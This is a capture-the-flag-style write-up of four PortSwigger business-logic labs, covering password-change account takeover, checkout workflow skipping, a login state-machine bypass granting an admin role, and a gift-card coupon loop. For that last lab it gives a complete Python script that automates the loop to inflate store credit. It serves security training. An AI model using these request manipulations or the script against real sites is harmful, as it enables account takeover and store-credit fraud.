---
title: Portswigger Business Logic Labs 2
date: 2026-10-20
categories:
  - - Writeups
tags:
  - Web
  - Portswigger
cover: /images/lain6.jpeg
---

Tackling more  Business Logic Labs from Portswigger

<!-- more -->

---

## Lab: Weak isolation on dual-use endpoint

### Description

>This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete the user `carlos`.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Test credentials -> `wiener:peter`.

We login and inspect the `account management features`  where the flaw lives. The only feature is a password change functionality. 

![](images/235.png)

HTTP Request:

```http
POST /my-account/change-password HTTP/2
Host: 0a3c00450328e2bb80c971580028008a.web-security-academy.net
Cookie: session=jU6d5iRCKYEeLQM0yLEHDqWgqT1k2oqi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8r
Content-Type: application/x-www-form-urlencoded
Content-Length: 111

csrf=$&username=wiener&current-password=$&new-password-1=$&new-password-2=$
```

The username is included in the request and we can change it to our target account `administrator` . But comes the issue , we don't know the current password??

What if we remove the `current password` parameter , will it still work?? Lets see:

![](images/234.png)
It worked . Let's delete `carlos`:

![](images/1111.png)

In this case the `dual-use endpoint` means that the `/my-account/change-password` is used by the admin users to change users passwords while also being used by users to change their own passwords.

## Lab: Insufficient workflow validation

### Description

>This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Goal -> `buy a "Lightweight l33t leather jacket"`

What we Know -> `The Lab makes flawed assumptions about the sequence of events in the purchasing workflow.`

The Flow when buying an item:

*1.Add the item to cart*

HTTP request:
```http
POST /cart HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

productId=16&redir=PRODUCT&quantity=1
```

*2.Place Order:*

HTTP request:

```http
POST /cart/checkout HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

csrf=EalyvLe6xOIqkbW0YAnHwSoblM74RJwl
```

Depending with if the request is successful or not you get:

*1.Error* :

```http
GET /cart?err=INSUFFICIENT_FUNDS HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

*2.Successful:*

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a53000503ad74448297a1df00cd009c.web-security-academy.net
Cookie: session=yygHV0cj2KQTsHTBS4VeG53LYQqEy6OW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

To solve the lab , what i found , we need to skip the checkout and replace it with the successful request , that is when we place the order:

![](images/23.png)

## Lab: Authentication bypass via flawed state machine

### Description

>This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete the user `carlos`.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Once again the bug exists only in the authentication flow so that is what we will focus on.

#### Authentication flow

1.Send `Post /login`

```http
POST /login HTTP/2
Host: 0a8d00b20336f66a8108a723005e001c.web-security-academy.net
Cookie: session=sDamO0mM2rqSyim670AlBLun0z1tz5Wp
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 68


csrf=tfMNU48J6ndwDU5pYAEw4exiOOEIa0Lz&username=wiener&password=peter
```

2.Send `GET /role-selector`

```http
GET /role-selector HTTP/2
Host: 0a8d00b20336f66a8108a723005e001c.web-security-academy.net
Cookie: session=bbpN2EmEiJQAsV8ktVDEAdKjKwJVaKUY
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

```

3.Send `Post /role-selector`

```http
POST /role-selector HTTP/2
Host: 0a8d00b20336f66a8108a723005e001c.web-security-academy.net
Cookie: session=wXiuGuHAfC4qSGwpumfbRmomNOcqoAon
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 57


role=content-author&csrf=NKLjc0N03qNzOWXyhi6jdvmawtbUydFU
```

The `role` parameter is very interesting.

#### Trying to Exploit

The description clearly says we need to break the above sequence . Logically , the step we need to skip is the `Get /role-selector` since this request boxes us as a user(is what i presume).

So , with intercept on in burp , go through the normal flow , but when you get to `Get /role-selector` , which is the redirect location of /login , replace it with the `POST /role-selector` request and change `role=admin` and the cookie to your current session cookie. Then send.

You'll get the error `invalid csrf token` . Ignore it and visit `/admin` and delete the target to solve the lab.

![](images/23445.png)


## Lab: Infinite money logic flaw

### Description

>This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
>You can log in to your own account using the following credentials: `wiener:peter`


### Solve

The logic flaw exists in the purchasing flow so that is what we are going to focus on. There exist an item `gift card` at $10 each. We also have a coupon `Signup30` that gives 30% off when we checkout.

#### The Infinite money flaw

1. Our initial store credit:

![](images/22222.png)

2. After Checking out the gift card:

![](images/2443.png)

3. After applying the Gift Card:

![](images/ererr.png)

So for every checkout -> Redeeming , we get an extra $3 . We need $1237 more so that we can buy the jacket . That is 413 runs . Or instead of buying 1 giftcard at a time , we can buy 10.

I automated(had help from claude) the process using a script

```python
import re
import time
import requests

BASE = "https://0ae6009603321ad980509417005200d1.web-security-academy.net"
SESSION_COOKIE = "WCcK27OpKBsLCqHtOrNsrP0UaM4ii0yo" 
PRODUCT_ID = 2
QUANTITY = 10
COUPON = "SIGNUP30"
TARGET_BALANCE = 1500.0
MIN_BALANCE_PER_CYCLE = 70.0  

s = requests.Session()
s.cookies.set("session", SESSION_COOKIE, domain=BASE.replace("https://", ""))
s.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0",
    "Content-Type": "application/x-www-form-urlencoded",
})

def get_csrf(path):
    r = s.get(BASE + path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError(f"Couldn't find CSRF token on {path}:\n{r.text[:500]}")
    return m.group(1)


def get_balance():
    r = s.get(BASE + "/my-account?id=wiener")
    m = re.search(r'Store credit:\s*\$([\d.]+)', r.text)
    if not m:
        raise RuntimeError(f"Couldn't parse balance:\n{r.text[:800]}")
    return float(m.group(1))


def add_to_cart():
    csrf_page = s.get(BASE + f"/product?productId={PRODUCT_ID}")  
    data = {"productId": PRODUCT_ID, "redir": "PRODUCT", "quantity": QUANTITY}
    r = s.post(BASE + "/cart", data=data)
    r.raise_for_status()


def apply_coupon():
    csrf = get_csrf("/cart")
    data = {"csrf": csrf, "coupon": COUPON}
    r = s.post(BASE + "/cart/coupon", data=data)
    r.raise_for_status()


def checkout():
    csrf = get_csrf("/cart")
    data = {"csrf": csrf}
    r = s.post(BASE + "/cart/checkout", data=data)  
    r.raise_for_status()
    return r.text


def extract_gift_codes(confirmation_html):
    marker = "You have bought the following gift cards"
    idx = confirmation_html.find(marker)
    section = confirmation_html[idx:] if idx != -1 else confirmation_html
    all_codes = re.findall(r'<td>([A-Za-z0-9]{10})</td>', section)
    return all_codes[:QUANTITY] 


def redeem_gift_code(code):
    csrf = get_csrf("/my-account?id=wiener")
    data = {"csrf": csrf, "gift-card": code}
    r = s.post(BASE + "/gift-card", data=data)
    r.raise_for_status()
    return r.text


def run_cycle():
    print("Adding 10 gift cards to cart...")
    add_to_cart()
    print("Applying SIGNUP30 coupon...")
    apply_coupon()
    print("Checking out...")
    confirmation_html = checkout()

    codes = extract_gift_codes(confirmation_html)
    print(f"This order's codes: {codes}")

    if len(codes) != QUANTITY:
        raise RuntimeError(
            f"Expected {QUANTITY} codes, got {len(codes)} — "
            f"page format may have changed.\n{confirmation_html[:1500]}"
        )

    for code in codes:
        print(f"Redeeming {code}...")
        redeem_gift_code(code)
        time.sleep(0.1)


def main():
    balance = get_balance()
    print(f"Starting balance: ${balance:.2f}")
    cycles = 0
    while balance < TARGET_BALANCE:
        if balance < MIN_BALANCE_PER_CYCLE:
            raise RuntimeError(f"Balance ${balance:.2f} too low to afford next cycle (${MIN_BALANCE_PER_CYCLE})")
        run_cycle()
        cycles += 1
        new_balance = get_balance()
        print(f"Cycle {cycles} done. Balance: ${new_balance:.2f}")
        if new_balance <= balance:
            raise RuntimeError("Balance didn't increase — logic flaw path may have broken, stopping to avoid infinite loop")
        balance = new_balance
    print(f"Target reached in {cycles} cycles. Final balance: ${balance:.2f}")


if __name__ == "__main__":
    main()
```

Finally buy the jacket:

![](images/45rgrbv.png)

